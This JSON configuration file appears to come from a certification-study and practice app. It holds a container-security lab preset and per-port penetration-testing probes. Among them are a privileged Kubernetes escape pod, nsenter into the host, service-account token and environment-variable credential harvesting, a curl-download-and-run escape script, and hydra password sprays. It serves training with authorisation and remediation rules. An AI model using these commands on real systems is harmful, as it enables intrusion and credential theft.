    "DOMAIN WEIGHTS ARE NOT OFFICIAL. HashiCorp publishes the 004 objective list but no percentage weighting anywhere. The weights above are derived by this app from the count of published sub-objectives in each group (3/37, 4/37, 7/37, 8/37, 4/37, 4/37, 3/37, 4/37, rounded to sum to 100) purely to order a study queue. They must be labelled 'derived study allocation — HashiCorp publishes no weights' wherever they are shown, and never presented as exam weighting.",
    "Passing score. Not published by HashiCorp. passMark is set to 0 to mean 'not published'; the widely-repeated 70% has no vendor source.",
    "Question count. HashiCorp's own pages state only that the exam is one hour and multiple choice. '~57 questions' is third-party and repeated across study blogs; treat the per-question pace target as approximate.",
    "The retirement date for version 003 (widely reported as 8 January 2026, last scheduling 5 January 2026) comes from third-party guides, not from a HashiCorp page found during verification. What IS confirmed is that HashiCorp presents 004 as the current version.",
    "Retake waiting period between attempts — HashiCorp confirms no free retake is included but no cooling-off period was found on the pages checked.",
    "Whether scratch paper or a whiteboard is permitted; the published rules cover the room and devices but were not found to address this."
   ],
   "weightsDerived": true,
   "weightsNote": "HashiCorp publishes NO domain weights. These are a derived study allocation, apportioned from the 37 published sub-objectives in the 004 content list and normalised to 100. Use them to budget study time, not as exam facts.",
   "notes": [],
   "appFeatures": []
  },
  {
   "id": "cloud-native-lab",
   "name": "Cloud-Native Lab",
   "icon": "🧪",
   "tagline": "No timer, no score, no proctor. Stand up a cluster, find what is wrong with it, break out of a container, fix it, prove the fix — the week-to-week loop of an actual DevSecOps engineer.",
   "kind": "tasks",
   "focus": "kubernetes",
   "status": "active",
   "statusNote": "",
   "durationMin": 0,
   "taskCount": 0,
   "format": "Free-form practice lab. No exam, no clock, no scoring, no proctor and nothing to submit. Bring your own environment — kind, minikube, k3s, a scratch EKS/GKE/AKS cluster, or just a Docker host — and work the loop: stand up or connect, enumerate, audit against a benchmark, attempt an escape or privilege-escalation path, remediate, verify. The 'domains' below are a suggested time split for a session, not a curriculum.",
   "passMark": 0,
   "curriculumVersion": "n/a — practice lab, no vendor curriculum and no exam version",
   "retakeNote": "",
   "domains": [
    {
     "id": "env",
     "name": "Environment & access",
     "weight": 10,
     "competencies": [
      "Stand up or connect to a disposable cluster or Docker host",
      "Confirm which context and namespace you are actually pointed at",
      "Know your own effective permissions before assuming anything",
      "Snapshot or note how to reset the lab before you break it"
     ]
    },
    {
     "id": "enumerate",
     "name": "Enumeration & inventory",
     "weight": 20,
     "competencies": [
      "Inventory workloads, namespaces, nodes and exposed services",
      "Inventory identity: service accounts, roles, bindings, cluster-admin holders",
      "Inventory data: secrets, configmaps, mounted volumes, image registries in use",
      "Inventory the network: ingress, services, whether any NetworkPolicy exists at all",
      "Inventory images: what is actually running, and from where"
     ]
    },
    {
     "id": "audit",
     "name": "Configuration audit against a benchmark",
     "weight": 25,
     "competencies": [
      "Run a CIS benchmark against the Docker host and/or the cluster nodes",
      "Scan running images for vulnerabilities, misconfiguration and embedded secrets",
      "Audit workload manifests against Pod Security Standards and policy-as-code",
      "Audit IaC (Terraform/Helm/Compose) that produced the environment",
      "Triage findings into exploitable, hardening-debt and noise — with a reason for each"
     ]
    },
    {
     "id": "escape",
     "name": "Escape & privilege-escalation paths",
     "weight": 25,
     "competencies": [
      "Determine whether you are in a container and what the container is allowed to do",
      "Enumerate capabilities, seccomp/AppArmor state, and namespace sharing",
      "Test the classic paths: mounted docker.sock, privileged, hostPID/hostPath, dangerous capabilities",
      "Test identity escalation: service-account tokens, over-broad RBAC, kubelet exposure",
      "Chain one finding into another — a single misconfiguration is rarely the whole story",
      "Record exactly which property made each path work"
     ]
    },
    {
     "id": "remediate",
     "name": "Remediation",
     "weight": 15,
     "competencies": [
      "Fix the property that enabled the path, not the symptom",
      "Push the fix left: into the Dockerfile, the manifest, the Helm values, the Terraform",
      "Add a guardrail so the class of issue cannot come back (admission policy, CI gate)",
      "Add detection for what you cannot prevent"
     ]
    },
    {
     "id": "verify",
     "name": "Verification & notes",
     "weight": 5,
     "competencies": [
      "Re-run the exact check that produced the finding",
      "Re-run the exploit path and confirm it now fails",
      "Confirm the workload still works after hardening",
      "Write down what you learned while it is still in your head"
     ]
    }
   ],
   "phases": [
    {
     "id": "standup",
     "name": "Stand up / connect",
     "goal": "Get a disposable environment you are authorised to break, and know exactly which one you are pointed at. Everything after this is wasted if the answer to 'which cluster?' is wrong.",
     "items": [
      {
       "label": "List every context you have and pick the lab one deliberately",
       "hint": "kubectl config get-contexts"
      },
      {
       "label": "Confirm the current context out loud before running anything destructive",
       "hint": "kubectl config current-context"
      },
      {
       "label": "Pin the namespace so you stop typing -n",
       "hint": "kubectl config set-context --current --namespace=<NAMESPACE>"
      },
      {
       "label": "Confirm you are NOT on a production or shared cluster — check the server URL, not just the context name",
       "hint": "kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}'"
      },
      {
       "label": "Know your own effective rights before you conclude anything is 'locked down'",
       "hint": "kubectl auth can-i --list"
      },
      {
       "label": "For a Docker-only lab: engine, storage driver, rootless or not, live-restore",
       "hint": "docker info"
      },
      {
       "label": "Note the reset command for this lab (kind delete cluster, docker compose down -v, terraform destroy)",
       "hint": ""
      }
     ]
    },
    {
     "id": "enumerate",
     "name": "Enumerate what is running",
     "goal": "Build the inventory before you form an opinion. Most real findings are visible in plain listings — a cluster-admin binding on a default service account, a secret mounted into a public-facing pod, an image from a registry nobody recognises.",
     "items": [
      {
       "label": "Everything running, everywhere",
       "hint": "kubectl get pods --all-namespaces -o wide"
      },
      {
       "label": "Nodes, versions, and which ones are control plane",
       "hint": "kubectl get nodes -o wide"
      },
      {
       "label": "Identity surface: who can become cluster-admin",
       "hint": "kubectl get clusterrolebindings -o wide"
      },
      {
       "label": "Service accounts in use, including the defaults nobody meant to use",
       "hint": "kubectl get serviceaccounts --all-namespaces"
      },
      {
       "label": "Data surface: secrets and configmaps across namespaces",
       "hint": "kubectl get secrets --all-namespaces"
      },
      {
       "label": "Decode one secret to see what is really in there",
       "hint": "kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o jsonpath='{.data}' | jq -r 'to_entries[] | \"\\(.key): \\(.value | @base64d)\"'"
      },
      {
       "label": "Network surface: what is exposed and whether anything is segmented at all",
       "hint": "kubectl get ingress --all-namespaces && kubectl get networkpolicies --all-namespaces"
      },
      {
       "label": "Storage surface: host paths and persistent volumes",
       "hint": "kubectl get pv,pvc --all-namespaces"
      },
      {
       "label": "Docker-side inventory: containers, mounts, published ports",
       "hint": "docker ps --format 'table {{.Names}}\\t{{.Image}}\\t{{.Ports}}'"
      },
      {
       "label": "What each container is actually mounting from the host",
       "hint": "docker inspect -f '{{ json .Mounts }}' <CONTAINER>"
      }
     ]
    },
    {
     "id": "audit",
     "name": "Audit configuration against a benchmark",
     "goal": "Measure the environment against something external — CIS, Pod Security Standards, a policy bundle — so findings come from a standard rather than from taste. Scan the images and the IaC too: the cluster is downstream of both.",
     "items": [
      {
       "label": "CIS Docker Benchmark against the host",
       "hint": "docker run --rm --net host --pid host --userns host --cap-add audit_control -v /var/run/docker.sock:/var/run/docker.sock:ro -v /etc:/etc:ro docker/docker-bench-security"
      },
      {
       "label": "Just the warnings, for a first pass",
       "hint": "sudo sh docker-bench.sh -i | grep -E '\\[WARN\\]'"
      },
      {
       "label": "CIS Kubernetes Benchmark on control plane and nodes",
       "hint": "kube-bench run --targets master,node"
      },
      {
       "label": "Whole-cluster vulnerability and misconfiguration sweep",
       "hint": "trivy k8s --report summary cluster"
      },
      {
       "label": "Per-image scan with the three scanners that matter: vulns, misconfig, secrets",
       "hint": "trivy image --scanners vuln,misconfig,secret <IMAGE>:<TAG>"
      },
      {
       "label": "Image compliance against the Docker CIS profile",
       "hint": "trivy image --compliance docker-cis-1.6.0 --report summary <IMAGE>"
      },
      {
       "label": "Framework scan of workloads (NSA/CISA hardening guidance)",
       "hint": "kubescape scan framework nsa --include-namespaces <NAMESPACE>"
      },
      {
       "label": "Manifest audit against Pod Security Standards",
       "hint": "polaris audit --audit-path <PATH> --format pretty"
      },
      {
       "label": "Policy-as-code check on the manifests you are about to apply",
       "hint": "conftest test <FILE>.yaml -p <PATH>/policies/"
      },
      {
       "label": "Audit the IaC that built this — Terraform, Helm, Dockerfiles, K8s YAML in one pass",
       "hint": "checkov -d <PATH> --framework terraform,kubernetes,helm,dockerfile"
      },
      {
       "label": "Terraform-specific scan with a severity floor so the output stays readable",
       "hint": "tfsec --minimum-severity HIGH <PATH>"
      },
      {
       "label": "Dockerfile lint — the cheapest finding of the session",
       "hint": "docker run --rm -i hadolint/hadolint < Dockerfile"
      },
      {
       "label": "Triage: mark each finding exploitable / hardening-debt / noise, with a one-line reason",
       "hint": ""
      }
     ]
    },
    {
     "id": "escape",
     "name": "Attempt an escape or privesc path",
     "goal": "Prove the finding instead of filing it. A scanner saying 'privileged container' is a config note; a shell on the node is a conversation with your platform team. Only ever do this in the lab you stood up in phase one.",
     "items": [
      {
       "label": "Confirm you are actually in a container before theorising about escaping one",
       "hint": "ls -la /.dockerenv 2>/dev/null; grep -qa 'docker\\|lxc\\|kubepods' /proc/1/cgroup && echo IN_CONTAINER"
      },
      {
       "label": "Full container posture in one shot: caps, seccomp, namespaces",
       "hint": "amicontained"
      },
      {
       "label": "Effective capabilities the hard way, when amicontained is not available",
       "hint": "capsh --print 2>/dev/null || grep CapEff /proc/self/status"
      },
      {
       "label": "Seccomp and LSM state — an unconfined profile is half the escape",
       "hint": "grep Seccomp /proc/self/status; cat /proc/self/attr/current 2>/dev/null"
      },
      {
       "label": "Host devices and block devices visible from inside",
       "hint": "ls -la /dev | grep -E 'sda|nvme|vda|mapper' && grep -i seccomp /proc/self/status"
      },
      {
       "label": "Host mounts leaking in — the single most common real-world escape",
       "hint": "mount | grep -vE 'proc|sys|cgroup|tmpfs|overlay|shm|mqueue'; grep -i host /proc/self/mountinfo"
      },
      {
       "label": "Exposed docker.sock ownership and permissions on the host side",
       "hint": "sudo stat -c '%n %U:%G %a' /var/run/docker.sock /etc/docker/daemon.json /etc/docker 2>/dev/null"
      },
      {
       "label": "Automated container-escape enumeration",
       "hint": "curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh && chmod +x deepce.sh && ./deepce.sh"
      },
      {
       "label": "Broad escape-surface evaluation",
       "hint": "./cdk evaluate --full"
      },
      {
       "label": "The hostPID payoff, when the container shares the host PID namespace",
       "hint": "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"
      },
      {
       "label": "Kubernetes escape pod — privileged + hostPID, straight to the node",
       "hint": "kubectl run escpod --image=alpine -n <NAMESPACE> -it --overrides='{\"spec\":{\"hostPID\":true,\"hostNetwork\":true,\"containers\":[{\"name\":\"c\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--target\",\"1\",\"--mount\",\"--uts\",\"--ipc\",\"--net\",\"--pid\",\"--\",\"sh\"],\"securityContext\":{\"privileged\":true},\"stdin\":true,\"tty\":true}]}}'"
      },
      {
       "label": "Identity escalation: grab the service-account token and test what it can do",
       "hint": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
      },
      {
       "label": "The RBAC question that ends most lab sessions early",
       "hint": "kubectl auth can-i '*' '*' --all-namespaces"
      },
      {
       "label": "Cluster attack surface from outside the pod",
       "hint": "kube-hunter --remote <TARGET_IP>"
      },
      {
       "label": "Environment-variable harvest across processes — credentials hide here",
       "hint": "for p in /proc/[0-9]*/environ; do tr '\\0' '\\n' < \"$p\" 2>/dev/null | grep -iE 'pass|token|secret|key|aws'; done"
      },
      {
       "label": "Write down the single property that made the path work — that property is the fix",
       "hint": ""
      }
     ]
    },
    {
     "id": "fix",
     "name": "Fix what you found",
     "goal": "Remediate the enabling property and push the fix as far left as it will go. A fix applied only to the running pod is a fix that survives until the next deploy.",
     "items": [
      {
       "label": "Drop the capability instead of shipping the container privileged",
       "hint": "docker run --rm --cap-drop=ALL --cap-add=<CAP> --security-opt no-new-privileges:true <IMAGE>"
      },
      {
       "label": "Read-only root filesystem with an explicit writable tmpfs",
       "hint": "docker run --rm --read-only --tmpfs /tmp:rw,noexec,nosuid <IMAGE>"
      },
      {
       "label": "Attach the seccomp profile rather than running unconfined",
       "hint": "docker run --rm --security-opt seccomp=<PATH>/profile.json <IMAGE>"
      },
      {
       "label": "Never mount the socket — if a container truly needs the API, put a broker in front of it",
       "hint": ""
      },
      {
       "label": "Enforce Pod Security Standards at the namespace boundary",
       "hint": "kubectl label namespace <NAMESPACE> pod-security.kubernetes.io/enforce=restricted --overwrite"
      },
      {
       "label": "Stop the automatic service-account token mount where it is not needed",
       "hint": "kubectl patch serviceaccount <NAME> -n <NAMESPACE> -p '{\"automountServiceAccountToken\":false}'"
      },
      {
       "label": "Default-deny ingress in the namespace, then allow what is genuinely needed",
       "hint": "kubectl apply -f <PATH>/default-deny.yaml"
      },
      {
       "label": "Encode the rule as policy so it cannot regress (Kyverno/Gatekeeper)",
       "hint": "kubectl apply -f <PATH>/policy.yaml"
      },
      {
       "label": "Fix it upstream: Dockerfile USER, Helm values, Terraform, and the CI gate",
       "hint": "checkov -d <PATH> --compact"
      },
      {
       "label": "Add detection for what you could not prevent",
       "hint": "kubectl logs -n falco -l app.kubernetes.io/name=falco --tail 100"
      }
     ]
    },
    {
     "id": "verify",
     "name": "Verify the fix, then write it down",
     "goal": "Re-run the exact check and the exact exploit. 'I applied the manifest' is not 'the path is closed', and the workload still has to work afterwards.",
     "items": [
      {
       "label": "Re-run the benchmark check that produced the finding and confirm it flipped",
       "hint": "kube-bench run --targets master,node"
      },
      {
       "label": "Re-run the image scan as a hard gate — exit code, not eyeballs",
       "hint": "trivy image --exit-code 1 --severity HIGH,CRITICAL <IMAGE>:<TAG>"
      },
      {
       "label": "Re-run the escape path and confirm it now fails",
       "hint": "amicontained"
      },
      {
       "label": "Confirm the effective permissions actually shrank",
       "hint": "kubectl auth can-i --list"
      },
      {
       "label": "Confirm the workload still starts, serves and passes its probes",
       "hint": "kubectl get pods -n <NAMESPACE> -o wide && kubectl describe pod <POD> -n <NAMESPACE> | tail -20"
      },
      {
       "label": "Tear the lab down so nothing privileged outlives the session",
       "hint": "kubectl delete pod escpod -n <NAMESPACE> --force --grace-period=0"
      },
      {
       "label": "Write the one-paragraph note: what was wrong, what enabled it, what you changed, how you proved it",
       "hint": ""
      }
     ]
    }
   ],
   "timeSavers": [
    {
     "label": "Answer 'which cluster am I about to break' in one line",
     "cmd": "kubectl config current-context && kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}'",
     "why": "Context name lies more often than the server URL does — a context called 'kind-lab' can point at a shared cluster after a kubeconfig merge. Two seconds here is the difference between a lab exercise and an incident."
    },
    {
     "label": "Full container posture in one command",
     "cmd": "amicontained",
     "why": "Container runtime, effective capabilities, seccomp status, namespace sharing and AppArmor in a single output. Replaces five or six separate /proc greps at the start of every escape attempt, and tells you immediately whether the path is worth trying."
    },
    {
     "label": "Automated escape enumeration while you read the audit output",
     "cmd": "curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh && chmod +x deepce.sh && ./deepce.sh",
     "why": "Enumerates docker.sock, privileged mode, capabilities, mounted host paths, exposed APIs and known escape paths in one run. Lab-only: it is noisy and it downloads and runs a script, so it belongs nowhere near production."
    },
    {
     "label": "Your real permissions, not your assumed ones",
     "cmd": "kubectl auth can-i --list",
     "why": "The fastest way to find an over-broad role, and the fastest way to stop wasting ten minutes on an attack path your token was never going to allow. Also the cleanest before/after evidence that an RBAC fix actually shrank something."
    },
    {
     "label": "Whole-cluster scan before per-image scans",
     "cmd": "trivy k8s --report summary cluster",
     "why": "One command produces the cluster-wide summary — misconfigurations, vulnerable images, exposed secrets — so you pick the two or three workloads worth a deep scan instead of scanning twenty images serially."
    },
    {
     "label": "Untruncated host-mount check",
     "cmd": "mount | grep -vE 'proc|sys|cgroup|tmpfs|overlay|shm|mqueue'; grep -i host /proc/self/mountinfo",
     "why": "Filters away the expected container mounts so the leaked host paths stand out. This one line finds the majority of real-world escapes — /var/run/docker.sock, /, /etc, /var/lib/kubelet — in a couple of seconds."
    },
    {
     "label": "One IaC scan across four frameworks",
     "cmd": "checkov -d <PATH> --framework terraform,kubernetes,helm,dockerfile --compact",
     "why": "The environment came from code. Scanning all four frameworks in one pass, in compact output, finds the source of a cluster finding in the same minute you found it — which is where the fix actually belongs."
    },
    {
     "label": "Gate on exit code when verifying",
     "cmd": "trivy image --exit-code 1 --severity HIGH,CRITICAL --ignore-unfixed <IMAGE>:<TAG>",
     "why": "Verification should be binary. An exit code turns 'looks better' into pass/fail, and the same command drops straight into CI as the guardrail so the finding cannot come back."
    }
   ],
   "allowedDocs": [
    {
     "label": "CIS Benchmarks (Docker and Kubernetes)",
     "url": "https://www.cisecurity.org/cis-benchmarks",
     "note": "No exam rules apply here — this is a lab, everything is allowed. This is the standard docker-bench-security and kube-bench measure against; read the rationale for a control before you 'fix' it."
    },
    {
     "label": "Kubernetes Pod Security Standards",
     "url": "https://kubernetes.io/docs/concepts/security/pod-security-standards/",
     "note": "The privileged / baseline / restricted definitions that namespace enforcement labels map to."
    },
    {
     "label": "Kubernetes security documentation",
     "url": "https://kubernetes.io/docs/concepts/security/",
     "note": "RBAC, service-account tokens, admission control, secrets at rest — the primary source for the remediation phase."
    },
    {
     "label": "Docker Engine security documentation",
     "url": "https://docs.docker.com/engine/security/",
     "note": "Capabilities, seccomp, AppArmor, userns-remap and rootless mode — the properties you drop in the fix phase."
    },
    {
     "label": "MITRE ATT&CK for Containers",
     "url": "https://attack.mitre.org/matrices/enterprise/containers/",
     "note": "Technique IDs for the escape phase; the corpus already tags commands with ATT&CK IDs, so findings can be labelled consistently."
    },
    {
     "label": "Falco rules reference",
     "url": "https://falco.org/docs/reference/rules/",
     "note": "For the 'add detection for what you cannot prevent' step."
    },
    {
     "label": "Trivy documentation",
     "url": "https://trivy.dev/latest/docs/",
     "note": "Scanner flags for image, config, k8s and compliance modes used across the audit and verify phases."
    },
    {
     "label": "Checkov policy index",
     "url": "https://www.checkov.io/5.Policy%20Index/all.html",
     "note": "Look up what a CKV_ id actually means before suppressing it."
    }
   ],
   "rules": [
    {
     "kind": "required",
     "text": "Only run this against infrastructure you own or have written authorisation to test. The escape phase is genuine exploitation, not a scan.",
     "enforceable": "Require an explicit lab-environment confirmation (context name plus API server URL) before the escape phase unlocks, and show that confirmation in the session header the whole time.",
     "source": "Lab discipline — no vendor rule applies to this preset",
     "confidence": "inferred"
    },
    {
     "kind": "banned",
     "text": "Never run the escape phase on a production, shared or managed cluster. nsenter into PID 1, privileged escape pods and deepce are host-level actions.",
     "enforceable": "Keep a blocklist of context and server patterns (prod, live, the org's real API endpoints) and refuse to arm the escape phase when the current context matches.",
     "source": "Lab discipline — no vendor rule applies to this preset",
     "confidence": "inferred"
    },
    {
     "kind": "required",
     "text": "Know how to reset the lab before you break it — kind delete cluster, docker compose down -v, terraform destroy.",
     "enforceable": "Capture the reset command in the stand-up phase and offer it as a one-click action in every later phase.",
     "source": "Lab discipline — no vendor rule applies to this preset",
     "confidence": "inferred"
    },
    {
     "kind": "required",
     "text": "No finding is finished until the check has been re-run and the exploit path re-attempted. 'Applied' is not 'fixed'.",
     "enforceable": "Pair every fix item with the verification command that produced the finding, and leave the finding open in the session until that command is re-run.",
     "source": "Lab discipline — no vendor rule applies to this preset",
     "confidence": "inferred"
    },
    {
     "kind": "required",
     "text": "Tear down privileged artefacts at the end of the session — escape pods, host-path mounts, debug containers, socket mounts, cluster-admin bindings you created.",
     "enforceable": "Track every object created during the session and present a teardown checklist in the verify phase.",
     "source": "Lab discipline — no vendor rule applies to this preset",
     "confidence": "inferred"
    },
    {
     "kind": "allowed",
     "text": "Any documentation, any tooling, any AI assistance, any amount of time. There is no proctor, no clock and no score.",
     "enforceable": "Hide the countdown, budget bar and score estimate entirely for this preset — showing a disabled timer still makes it feel like exam prep.",
     "source": "Preset definition",
     "confidence": "inferred"
    }
   ],
   "pitfalls": [
    {
     "text": "Running the escape phase against the wrong cluster. A merged kubeconfig plus a context named 'lab' is all it takes; nsenter into PID 1 on a shared node is not a lab exercise.",
     "cost": "A production incident caused by a practice session, and a conversation that ends the practice sessions.",
     "guard": "Gate the escape phase behind an explicit confirmation of both context name and API server URL, and pin the current context in the header for the whole session."
    },
    {
     "text": "Collecting scanner output and calling it an audit. kube-bench, Trivy and Checkov will return hundreds of findings on a default cluster, most of them irrelevant to how it is actually deployed.",
     "cost": "Hours spent on a wall of text, no fixes shipped, and genuine exploitable issues buried under FAIL lines about audit log flags nobody is going to change.",
     "guard": "Force a triage step between audit and escape: every finding tagged exploitable / hardening-debt / noise with a one-line reason before the next phase opens."
    },
    {
     "text": "Fixing the symptom instead of the enabling property. Deleting the privileged pod, rather than removing the privileged flag from the Helm chart that will recreate it on the next deploy.",
     "cost": "The finding reappears at the next release, which is worse than not fixing it — you now believe it is fixed.",
     "guard": "Require each fix item to name where the change was made: running object, manifest, chart values, Dockerfile, or Terraform. Flag a session where every fix landed on a running object."
    },
    {
     "text": "Skipping verification because the fix was obvious. Namespace PSS labels that do not apply to already-running pods, NetworkPolicies that need a CNI that enforces them, capability drops silently overridden by a securityContext further down the manifest.",
     "cost": "Confident, documented, wrong. The worst outcome of the whole loop.",
     "guard": "Carry the exact command that produced each finding into the verify phase and keep the finding open until it has been re-run."
    },
    {
     "text": "Running kube-bench master checks against a managed cluster. On EKS, GKE and AKS you do not own the control plane, so the master target produces failures you cannot act on.",
     "cost": "Wasted triage time and a distorted picture of the cluster's real posture.",
     "guard": "Detect a managed control plane from the node/version output and default kube-bench to the node target, with a note explaining why."
    },
    {
     "text": "Leaving the lab hot. Escape pods, hostPath mounts, debug containers with docker.sock, a cluster-admin binding created 'just for a minute' — all of them outlive the session.",
     "cost": "A lab cluster that is itself the vulnerability, and a bad habit that follows you into real clusters.",
     "guard": "Track created objects during the session and present a teardown checklist before the session can be closed."
    },
    {
     "text": "Treating this like exam prep — chasing coverage of all six phases every session instead of following one real finding end to end.",
     "cost": "Broad, shallow familiarity and no muscle memory for the part that matters: proving an issue and closing it.",
     "guard": "Let phases be skipped freely, show no completion percentage, and make 'one finding taken from enumerate to verified' the session's success condition."
    }
   ],
   "retroSections": [
    "What was actually exploitable, and the single property that enabled it",
    "Findings triaged: exploitable / hardening-debt / noise, and what the noise ratio says about the tooling",
    "Where each fix landed: running object, manifest, chart, Dockerfile, or Terraform",
    "What was verified by re-running the check and re-running the exploit — and what was only assumed",
    "Guardrail added so this class of issue cannot return (admission policy, CI gate, detection rule)",
    "Techniques and ATT&CK IDs exercised this session",
    "Teardown confirmed: privileged objects, bindings and mounts removed",
    "What to try next week, and what environment it needs"
   ],
   "sources": [
    "https://www.cisecurity.org/cis-benchmarks",
    "https://kubernetes.io/docs/concepts/security/pod-security-standards/",
    "https://kubernetes.io/docs/concepts/security/",
    "https://docs.docker.com/engine/security/",
    "https://attack.mitre.org/matrices/enterprise/containers/",
    "https://falco.org/docs/reference/rules/",
    "https://trivy.dev/latest/docs/",
    "https://github.com/aquasecurity/kube-bench",
    "https://github.com/docker/docker-bench-security",
    "https://github.com/stealthcopter/deepce"
   ],
   "unverified": [
    "Nothing here is a vendor fact and nothing needed verifying against an exam body — this preset describes no certification. The 'domains' are this app's own suggested time split for a lab session and must be shown as such, never as a curriculum weighting.",
    "Whether a given fix is enforceable in the user's environment depends on the CNI, the admission controllers installed and whether the control plane is managed — the fix phase assumes a self-managed or local cluster."
   ],
   "notes": [
    "Corpus coverage check: kubescape, polaris, kube-bench, amicontained, deepce, cdk, trivy, checkov, cosign, falco, docker-bench and nsenter are all present in the command corpus. Genuinely thin: kubesec (absent) and kube-linter (barely covered) — both named in the CKS supply-chain domain."
   ],
   "appFeatures": []
  }
 ],
 "probes": [
  {
   "ports": [
    21
   ],
   "service": "ftp",
   "note": "Anonymous read is the headline, but the win is a writable dir that maps to a webroot or a cron-watched path — always test PUT even when the listing looks empty, and use `ls -la`/`mget .*` because dotfiles are hidden by default.",
   "commands": [
    {
     "label": "NSE sweep incl. backdoor checks",
     "cmd": "nmap -p21 -sCV --script ftp-anon,ftp-syst,ftp-bounce,ftp-vsftpd-backdoor,ftp-proftpd-backdoor <TARGET_IP> -oN nmap_ftp.txt",
     "when": "always"
    },
    {
     "label": "Anonymous login",
     "cmd": "ftp anonymous@<TARGET_IP>  # then: binary, passive, ls -la, mget .*",
     "when": "always"
    },
    {
     "label": "Recursive anonymous mirror",
     "cmd": "wget -m --no-passive-ftp ftp://anonymous:anonymous@<TARGET_IP>/ -P ./ftp_loot",
     "when": "if anonymous allowed"
    },
    {
     "label": "Writable-directory test",
     "cmd": "curl -T /etc/hostname ftp://<TARGET_IP>/test.txt --user 'anonymous:anonymous'",
     "when": "if anonymous allowed"
    },
    {
     "label": "Authenticated listing via netexec",
     "cmd": "nxc ftp <TARGET_IP> -u <USER> -p '<PASS>' --ls",
     "when": "if creds known"
    },
    {
     "label": "Credential spray",
     "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP> -t 4 -f",
     "when": "if usernames known and no lockout policy"
    }
   ]
  },
  {
   "ports": [
    22
   ],
   "service": "ssh",
   "note": "Before you burn hours brute-forcing, ask the server which auth methods it accepts — `PreferredAuthentications=none -v` lists them; publickey-only means stop. The banner's distro suffix (e.g. `Ubuntu-3ubuntu0.11`) pins the exact OS release better than any OS scan.",
   "commands": [
    {
     "label": "Algorithms, host keys, accepted auth methods",
     "cmd": "nmap -p22 -sCV --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods --script-args ssh.user=<USER> <TARGET_IP> -oN nmap_ssh.txt",
     "when": "always"
    },
    {
     "label": "Enumerate auth methods manually",
     "cmd": "ssh -v -o PreferredAuthentications=none -o StrictHostKeyChecking=no <USER>@<TARGET_IP> 2>&1 | grep -i 'authentications that can continue'",
     "when": "always"
    },
    {
     "label": "Full config/vuln audit",
     "cmd": "ssh-audit <TARGET_IP>:22",
     "when": "always"
    },
    {
     "label": "Login with a recovered private key",
     "cmd": "chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no -o IdentitiesOnly=yes <USER>@<TARGET_IP>",
     "when": "if key material found"
    },
    {
     "label": "Legacy-algorithm fallback (old OpenSSH/Dropbear)",
     "cmd": "ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa <USER>@<TARGET_IP>",
     "when": "if handshake fails with 'no matching key exchange'"
    },
    {
     "label": "Password spray (rate-limited)",
     "cmd": "hydra -L users.txt -P passwords.txt ssh://<TARGET_IP> -t 4 -f -e nsr",
     "when": "if password auth accepted"
    }
   ]
  },
  {
   "ports": [
    23,
    2323
   ],
   "service": "telnet",
   "note": "On embedded gear the banner is the whole engagement: model + firmware maps straight to a default-credential table, and plenty of devices drop you at a shell with no login at all. Also keep telnet around as your raw banner grabber for any weird port.",
   "commands": [
    {
     "label": "Banner + NTLM info (Windows telnet leaks domain/host)",
     "cmd": "nmap -p23 -sCV --script telnet-ntlm-info,telnet-encryption <TARGET_IP> -oN nmap_telnet.txt",
     "when": "always"
    },
    {
     "label": "Interactive connect",
     "cmd": "telnet <TARGET_IP> 23",
     "when": "always"
    },
    {
     "label": "Raw banner grab without telnet negotiation",
     "cmd": "nc -nv <TARGET_IP> 23",
     "when": "always"
    },
    {
     "label": "Default/blank credential spray",
     "cmd": "hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://<TARGET_IP> -t 4 -f",
     "when": "if device/appliance banner"
    },
    {
     "label": "Targeted spray",
     "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt telnet://<TARGET_IP> -t 4 -f",
     "when": "if username known"
    }
   ]
  },
  {
   "ports": [
    25,
    465,
    587
   ],
   "service": "smtp",
   "note": "VRFY is usually off but RCPT TO still enumerates, and the EHLO reply frequently leaks the internal hostname and the AUTH mechanisms — NTLM there gives you the domain for free. 587 needs STARTTLS (`swaks -tls`), 465 needs implicit TLS; a plain nc against them looks 'closed' when it isn't.",
   "commands": [
    {
     "label": "Commands, relay check, NTLM info",
     "cmd": "nmap -p25,465,587 -sCV --script smtp-commands,smtp-open-relay,smtp-ntlm-info,smtp-enum-users <TARGET_IP> -oN nmap_smtp.txt",
     "when": "always"
    },
    {
     "label": "User enumeration via RCPT TO",
     "cmd": "smtp-user-enum -M RCPT -D <DOMAIN> -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>",
     "when": "always"
    },
    {
     "label": "Manual EHLO / VRFY",
     "cmd": "nc -nv <TARGET_IP> 25  # EHLO x  /  VRFY root  /  RCPT TO:<<USER>@<DOMAIN>>",
     "when": "always"
    },
    {
     "label": "Open-relay proof",
     "cmd": "swaks --to victim@<DOMAIN> --from attacker@evil.tld --server <TARGET_IP> --header 'Subject: relay test' --body 'relay test'",
     "when": "always"
    },
    {
     "label": "Submission port with STARTTLS + auth",
     "cmd": "swaks --server <TARGET_IP>:587 --tls --auth-user '<USER>' --auth-password '<PASS>' --to <USER>@<DOMAIN> --from <USER>@<DOMAIN> --body 'auth test'",
     "when": "if creds known"
    },
    {
     "label": "Credential spray",
     "cmd": "hydra -L users.txt -P passwords.txt smtp://<TARGET_IP> -t 4 -f",
     "when": "if usernames known"
    }
   ]
  },
  {
   "ports": [
    53
   ],
   "service": "dns",
   "note": "AXFR is step one, but the quieter win is using the target's own resolver to brute internal names and to reverse-sweep the subnet — an internal DNS answering for a .local/.corp zone tells you the AD domain name before you touch 88 or 389. `version.bind` still pins BIND builds.",
   "commands": [
    {
     "label": "Zone transfer",
     "cmd": "dig axfr <DOMAIN> @<TARGET_IP>",
     "when": "always"
    },
